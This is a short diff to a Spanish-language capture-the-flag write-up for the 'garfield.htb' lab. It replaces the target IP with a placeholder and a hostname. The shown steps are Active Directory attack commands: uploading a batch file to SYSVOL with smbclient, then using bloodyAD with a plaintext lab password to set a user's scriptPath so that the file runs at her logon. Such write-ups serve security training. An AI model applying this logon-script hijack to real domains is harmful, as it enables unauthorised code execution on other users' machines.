@@ -203,7 +203,7 @@ BAT
 ### 7.3 Subir el BAT a SYSVOL
 
 ```bash
-smbclient //10.129.195.195/SYSVOL -U 'j.arbuckle'
+smbclient //<IP>/SYSVOL -U 'j.arbuckle'
 ```
 
 Dentro de `smbclient`:
@@ -220,7 +220,7 @@ exit
 Se configura el atributo `scriptPath` para que el usuario `Liz Wilson` ejecute `printerDetect.bat` al iniciar sesión:
 
 ```bash
-bloodyAD --host 10.129.195.195 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' \
+bloodyAD --host garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' \
 set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" \
 scriptPath -v printerDetect.bat
 ```
